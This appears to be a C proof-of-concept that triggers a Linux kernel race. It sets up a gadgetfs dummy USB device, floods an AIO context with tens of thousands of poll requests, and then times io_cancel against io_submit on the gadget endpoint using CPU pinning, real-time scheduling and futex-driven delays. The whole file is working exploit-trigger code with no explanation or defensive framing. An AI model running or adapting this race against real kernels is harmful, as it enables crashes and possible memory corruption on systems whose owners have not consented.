#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/aio_abi.h>
#include <linux/futex.h>
#include <linux/usb/ch9.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#ifndef IOCB_CMD_POLL
#define IOCB_CMD_POLL 5
#endif

#define EP0_PATH "/dev/gadget/dummy_udc"
#define EP_PATH "/dev/gadget/ep1in-bulk"
#define IO_LEN 65
#define DEFAULT_POLLERS 65472
#define HOLDER_THREADS 1

struct ep7 {
	uint8_t bLength, bDescriptorType, bEndpointAddress, bmAttributes;
	uint16_t wMaxPacketSize;
	uint8_t bInterval;
} __attribute__((packed));

struct desc_blob {
	uint32_t tag;
	struct usb_config_descriptor cfg;
	struct usb_interface_descriptor intf;
	struct ep7 ep_out;
	struct ep7 ep_in;
	struct usb_device_descriptor dev;
} __attribute__((packed));

struct ep_msg {
	uint32_t tag;
	struct ep7 ep;
} __attribute__((packed));

static aio_context_t ctx;
static struct iocb target_cb;
static struct iocb miss_cb;
static struct iocb *poll_cbs;
static struct iocb **poll_list;
static atomic_int race_go;
static atomic_int race_stop;
static atomic_int waiter_ready;
static atomic_int holder_started;
static atomic_int submit_started;
static atomic_int wake_seq;
static atomic_ulong target_cancel_calls;
static atomic_ulong miss_cancel_calls;
static long cancel_wake_delay_ns = 500000;
static int pollers = DEFAULT_POLLERS;

static long xio_setup(unsigned nr, aio_context_t *c)
{
	return syscall(SYS_io_setup, nr, c);
}

static long xio_destroy(aio_context_t c)
{
	return syscall(SYS_io_destroy, c);
}

static long xio_submit(aio_context_t c, long nr, struct iocb **list)
{
	return syscall(SYS_io_submit, c, nr, list);
}

static long xio_cancel(aio_context_t c, struct iocb *cb,
		       struct io_event *event)
{
	return syscall(SYS_io_cancel, c, cb, event);
}

static int futex_wait_private(atomic_int *addr, int expected)
{
	return syscall(SYS_futex, (int *)addr, FUTEX_WAIT_PRIVATE, expected,
		       NULL, NULL, 0);
}

static int futex_wake_private(atomic_int *addr)
{
	return syscall(SYS_futex, (int *)addr, FUTEX_WAKE_PRIVATE, 1,
		       NULL, NULL, 0);
}

static void pin_cpu(int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	if (sched_setaffinity(0, sizeof(set), &set))
		perror("sched_setaffinity");
}

static void busy_delay(long ns)
{
	struct timespec start, now;
	long elapsed;

	if (ns <= 0)
		return;
	clock_gettime(CLOCK_MONOTONIC_RAW, &start);
	do {
		clock_gettime(CLOCK_MONOTONIC_RAW, &now);
		elapsed = (now.tv_sec - start.tv_sec) * 1000000000L +
			  now.tv_nsec - start.tv_nsec;
	} while (elapsed < ns);
}

static void sleep_ns(long ns)
{
	struct timespec ts = { ns / 1000000000L, ns % 1000000000L };

	while (nanosleep(&ts, &ts) && errno == EINTR)
		;
}

static int write_device_desc(int fd)
{
	struct desc_blob d;

	memset(&d, 0, sizeof(d));
	d.cfg.bLength = USB_DT_CONFIG_SIZE;
	d.cfg.bDescriptorType = USB_DT_CONFIG;
	d.cfg.wTotalLength = USB_DT_CONFIG_SIZE + USB_DT_INTERFACE_SIZE +
			     2 * sizeof(struct ep7);
	d.cfg.bNumInterfaces = 1;
	d.cfg.bConfigurationValue = 1;
	d.cfg.bmAttributes = USB_CONFIG_ATT_ONE;
	d.cfg.bMaxPower = 1;
	d.intf.bLength = USB_DT_INTERFACE_SIZE;
	d.intf.bDescriptorType = USB_DT_INTERFACE;
	d.intf.bInterfaceNumber = 0;
	d.intf.bNumEndpoints = 2;
	d.intf.bInterfaceClass = 0xff;
	d.ep_out.bLength = sizeof(struct ep7);
	d.ep_out.bDescriptorType = USB_DT_ENDPOINT;
	d.ep_out.bEndpointAddress = 0x01;
	d.ep_out.bmAttributes = USB_ENDPOINT_XFER_BULK;
	d.ep_out.wMaxPacketSize = 64;
	d.ep_in.bLength = sizeof(struct ep7);
	d.ep_in.bDescriptorType = USB_DT_ENDPOINT;
	d.ep_in.bEndpointAddress = 0x81;
	d.ep_in.bmAttributes = USB_ENDPOINT_XFER_BULK;
	d.ep_in.wMaxPacketSize = 64;
	d.dev.bLength = USB_DT_DEVICE_SIZE;
	d.dev.bDescriptorType = USB_DT_DEVICE;
	d.dev.bcdUSB = 0x0200;
	d.dev.bDeviceClass = USB_CLASS_VENDOR_SPEC;
	d.dev.bMaxPacketSize0 = 64;
	d.dev.idVendor = 0x1d6b;
	d.dev.idProduct = 0x0104;
	d.dev.bcdDevice = 1;
	d.dev.bNumConfigurations = 1;

	if (write(fd, &d, sizeof(d)) != (ssize_t)sizeof(d)) {
		perror("write device descriptors");
		return -1;
	}
	return 0;
}

static int prepare_endpoint_permissions(void)
{
	int i;

	for (i = 0; i < 200; i++) {
		if (access(EP_PATH, F_OK) == 0) {
			if (chown(EP_PATH, 1000, 1000) || chmod(EP_PATH, 0666)) {
				perror("prepare endpoint permissions");
				return -1;
			}
			return 0;
		}
		sleep_ns(5000000L);
	}
	fprintf(stderr, "endpoint did not appear\n");
	return -1;
}

static int enable_in_endpoint(int fd)
{
	struct ep_msg msg;

	memset(&msg, 0, sizeof(msg));
	msg.tag = 1;
	msg.ep.bLength = sizeof(struct ep7);
	msg.ep.bDescriptorType = USB_DT_ENDPOINT;
	msg.ep.bEndpointAddress = 0x81;
	msg.ep.bmAttributes = USB_ENDPOINT_XFER_BULK;
	msg.ep.wMaxPacketSize = 64;
	if (write(fd, &msg, sizeof(msg)) != (ssize_t)sizeof(msg)) {
		perror("enable endpoint");
		return -1;
	}
	return 0;
}

static int submit_poll_fillers(void)
{
	int pipefd[2];
	long ret;
	int i;

	if (pipe2(pipefd, O_NONBLOCK | O_CLOEXEC)) {
		perror("pipe2");
		return -1;
	}
	poll_cbs = calloc((size_t)pollers, sizeof(*poll_cbs));
	poll_list = calloc((size_t)pollers, sizeof(*poll_list));
	if (!poll_cbs || !poll_list) {
		perror("calloc poll fillers");
		return -1;
	}
	for (i = 0; i < pollers; i++) {
		poll_cbs[i].aio_data = 0x70000000ULL + (unsigned)i;
		poll_cbs[i].aio_fildes = pipefd[0];
		poll_cbs[i].aio_lio_opcode = IOCB_CMD_POLL;
		poll_cbs[i].aio_buf = POLLIN;
		poll_list[i] = &poll_cbs[i];
	}
	ret = xio_submit(ctx, pollers, poll_list);
	fprintf(stderr, "poll_fillers=%ld requested=%d\n", ret, pollers);
	return ret == pollers ? 0 : -1;
}

static void *lock_holder_thread(void *arg)
{
	int cpu = (int)(intptr_t)arg;

	pin_cpu(cpu);
	while (!atomic_load_explicit(&race_go, memory_order_acquire))
		sched_yield();
	atomic_store_explicit(&holder_started, 1, memory_order_release);
	{
		struct io_event event;

		memset(&event, 0, sizeof(event));
		xio_cancel(ctx, &miss_cb, &event);
		atomic_fetch_add_explicit(&miss_cancel_calls, 1,
					  memory_order_relaxed);
	}
	atomic_store_explicit(&holder_started, 2, memory_order_release);
	return NULL;
}

static void *target_cancel_thread(void *arg)
{
	struct sched_param sp = { .sched_priority = 2 };
	int seen;

	(void)arg;
	pin_cpu(1);
	if (sched_setscheduler(0, SCHED_FIFO, &sp))
		perror("target cancel SCHED_FIFO");
	atomic_store_explicit(&waiter_ready, 1, memory_order_release);

	while (!atomic_load_explicit(&race_stop, memory_order_acquire)) {
		struct io_event event;

		seen = atomic_load_explicit(&wake_seq, memory_order_acquire);
		futex_wait_private(&wake_seq, seen);
		if (!atomic_load_explicit(&race_go, memory_order_acquire))
			continue;
		memset(&event, 0, sizeof(event));
		xio_cancel(ctx, &target_cb, &event);
		atomic_fetch_add_explicit(&target_cancel_calls, 1,
					  memory_order_release);
	}
	return NULL;
}

static void *wake_thread(void *arg)
{
	(void)arg;
	pin_cpu(2);
	while (!atomic_load_explicit(&submit_started, memory_order_acquire))
		sched_yield();
	busy_delay(cancel_wake_delay_ns);
	atomic_fetch_add_explicit(&wake_seq, 1, memory_order_release);
	futex_wake_private(&wake_seq);
	return NULL;
}

int main(int argc, char **argv)
{
	struct rlimit nofile = { 65535, 65535 };
	struct rlimit rtprio = { 2, 2 };
	struct sched_param idle = { 0 };
	pthread_t cancel_thread, waker, holders[HOLDER_THREADS];
	struct iocb *target_list[1];
	unsigned char *buf;
	int ep0, epfd;
	long ret;
	struct timespec scan_a, scan_b;
	struct io_event scan_event;
	long scan_ns;
	int i;

	if (argc > 1)
		pollers = atoi(argv[1]);
	if (argc > 2)
		cancel_wake_delay_ns = atol(argv[2]);
	if (pollers < 256)
		pollers = 256;
	if (pollers > 65472)
		pollers = 65472;

	setrlimit(RLIMIT_NOFILE, &nofile);
	setrlimit(RLIMIT_RTPRIO, &rtprio);
	mkdir("/dev/gadget", 0755);
	mount("gadgetfs", "/dev/gadget", "gadgetfs", 0, NULL);
	ep0 = open(EP0_PATH, O_RDWR | O_CLOEXEC);
	if (ep0 < 0) {
		perror("open ep0");
		return 1;
	}
	if (write_device_desc(ep0))
		return 2;
	sleep_ns(1000000000L);
	if (prepare_endpoint_permissions())
		return 2;
	if (setgid(1000) || setuid(1000)) {
		perror("drop uid/gid");
		return 3;
	}
	epfd = open(EP_PATH, O_RDWR | O_CLOEXEC);
	if (epfd < 0) {
		perror("open endpoint");
		return 4;
	}
	if (enable_in_endpoint(epfd))
		return 5;
	if (xio_setup((unsigned)pollers + 64, &ctx) < 0) {
		perror("io_setup");
		return 6;
	}
	if (submit_poll_fillers())
		return 7;

	memset(&miss_cb, 0, sizeof(miss_cb));
	miss_cb.aio_key = 0;
	memset(&scan_event, 0, sizeof(scan_event));
	clock_gettime(CLOCK_MONOTONIC_RAW, &scan_a);
	xio_cancel(ctx, &miss_cb, &scan_event);
	clock_gettime(CLOCK_MONOTONIC_RAW, &scan_b);
	scan_ns = (scan_b.tv_sec - scan_a.tv_sec) * 1000000000L +
		  scan_b.tv_nsec - scan_a.tv_nsec;
	fprintf(stderr, "miss_scan_ns=%ld\n", scan_ns);
	buf = malloc(IO_LEN);
	if (!buf)
		return 8;
	memset(buf, 'N', IO_LEN);
	memset(&target_cb, 0, sizeof(target_cb));
	target_cb.aio_data = (uint64_t)(uintptr_t)&target_cb;
	target_cb.aio_fildes = epfd;
	target_cb.aio_lio_opcode = IOCB_CMD_PWRITE;
	target_cb.aio_buf = (uint64_t)(uintptr_t)buf;
	target_cb.aio_nbytes = IO_LEN;
	target_cb.aio_key = 0;
	target_list[0] = &target_cb;

	fprintf(stderr,
		"uid=%d pollers=%d cancel_wake_delay_ns=%ld target_iocb=%p\n",
		getuid(), pollers, cancel_wake_delay_ns, (void *)&target_cb);

	atomic_store(&race_go, 0);
	atomic_store(&race_stop, 0);
	atomic_store(&waiter_ready, 0);
	atomic_store(&holder_started, 0);
	atomic_store(&submit_started, 0);
	atomic_store(&wake_seq, 0);
	atomic_store(&target_cancel_calls, 0);
	atomic_store(&miss_cancel_calls, 0);

	pthread_create(&cancel_thread, NULL, target_cancel_thread, NULL);
	pthread_create(&waker, NULL, wake_thread, NULL);
	for (i = 0; i < HOLDER_THREADS; i++)
		pthread_create(&holders[i], NULL, lock_holder_thread,
			       (void *)(intptr_t)3);

	while (!atomic_load_explicit(&waiter_ready, memory_order_acquire))
		sched_yield();

	pin_cpu(1);
	if (sched_setscheduler(0, SCHED_IDLE, &idle))
		perror("submitter SCHED_IDLE");
	atomic_store_explicit(&race_go, 1, memory_order_release);
	while (!atomic_load_explicit(&holder_started, memory_order_acquire))
		sched_yield();
	sleep_ns(50000L);
	atomic_store_explicit(&submit_started, 1, memory_order_release);

	ret = xio_submit(ctx, 1, target_list);
	fprintf(stderr,
		"target_submit=%ld errno=%d target_cancel_calls=%lu miss_calls=%lu\n",
		ret, errno, atomic_load(&target_cancel_calls),
		atomic_load(&miss_cancel_calls));

	atomic_store_explicit(&race_stop, 1, memory_order_release);
	atomic_fetch_add_explicit(&wake_seq, 1, memory_order_release);
	futex_wake_private(&wake_seq);
	xio_destroy(ctx);
	close(epfd);
	close(ep0);
	return ret == 1 ? 0 : 9;
}
